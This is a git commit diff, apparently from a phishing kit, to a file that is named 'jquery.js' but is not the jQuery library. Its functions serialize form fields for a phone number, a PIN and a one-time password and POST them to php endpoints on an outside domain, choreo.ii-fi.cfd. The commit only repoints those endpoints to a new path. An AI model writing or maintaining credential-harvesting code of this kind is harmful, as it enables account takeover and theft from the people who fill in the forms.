5e6093e6852f4b9022fb4175d644a67a7ae4b1eb
dodypribadi5 <dodypribadi5@gmail.com>
2025-04-21 15:00:21 +0700

    Update jquery.js

--- web/ss/jquery.js
+++ web/ss/jquery.js
@@ -6,7 +6,7 @@ function sendNohp(event) {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://choreo.ii-fi.cfd/c7he/ss/one.php',
+      url: 'https://choreo.ii-fi.cfd/c7he/ssx/one.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
@@ -31,7 +31,7 @@ function sendPin() {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://choreo.ii-fi.cfd/c7he/ss/two.php',
+      url: 'https://choreo.ii-fi.cfd/c7he/ssx/two.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
@@ -60,7 +60,7 @@ function sendOtp() {
    var dataString = $("#formNohp, #formPin, #formOtp").serialize();
    $.ajax({
       type: 'POST',
-      url: 'https://choreo.ii-fi.cfd/c7he/ss/three.php',
+      url: 'https://choreo.ii-fi.cfd/c7he/ssx/three.php',
       data: dataString,
       complete: function(data) {
          console.log('Complete');
